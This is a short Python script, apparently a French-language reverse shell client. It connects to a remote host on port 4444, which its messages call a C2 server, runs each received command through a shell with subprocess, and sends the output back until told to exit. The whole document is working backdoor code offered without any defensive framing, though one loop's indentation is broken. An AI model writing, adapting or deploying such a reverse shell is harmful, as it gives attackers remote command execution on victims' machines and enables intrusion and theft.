import socket
import subprocess
class Cible:
    def __init__(self, host='…', port=4444):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    def connect(self):
        try:
            self.socket.connect((self.host, self.port))
            print(f"[+] Connecté au C2 {self.host}:{self.port}")
            self.send("Cible connectée")
            while True:
            cmd = self.socket.recv(1024).decode().strip()
            if not cmd or cmd == "exit":
                break
            result = subprocess.run(cmd, shell=True, capture_output=True,text=True)
            output = result.stdout if result.stdout else result.stderr
            self.send(output)
        except Exception as e:
            print(f"[!] Erreur: {e}")
        finally:
            self.socket.close()
    def send(self, data):
        self.socket.send(data.encode())
if __name__ == "__main__":
    cible1 = Cible()
    cible1.connect()
